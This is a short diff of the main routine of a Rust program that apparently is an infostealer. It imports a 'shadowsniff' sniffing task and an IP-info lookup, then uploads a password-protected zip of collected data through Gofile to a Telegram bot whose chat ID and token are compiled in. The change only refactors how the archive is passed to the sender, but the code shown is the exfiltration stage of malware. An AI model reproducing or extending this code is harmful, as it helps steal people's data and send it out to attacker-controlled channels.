@@ -17,7 +17,7 @@ use filesystem::FileSystem;
 use ipinfo::init_ip_info;
 use sender::gofile::Gofile;
 use sender::telegram_bot::TelegramBot;
-use sender::{LogFile, LogSender};
+use sender::LogSender;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
@@ -63,7 +63,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     let telegram = TelegramBot::new(Arc::from(env!("TELEGRAM_CHAT_ID")), Arc::from(env!("TELEGRAM_BOT_TOKEN")));
 
     Gofile::new(telegram)
-        .send(LogFile::ZipArchive(zip), Some(password), &collector)
+        .send(zip.into(), Some(password), &collector)
         .unwrap();
 
     0
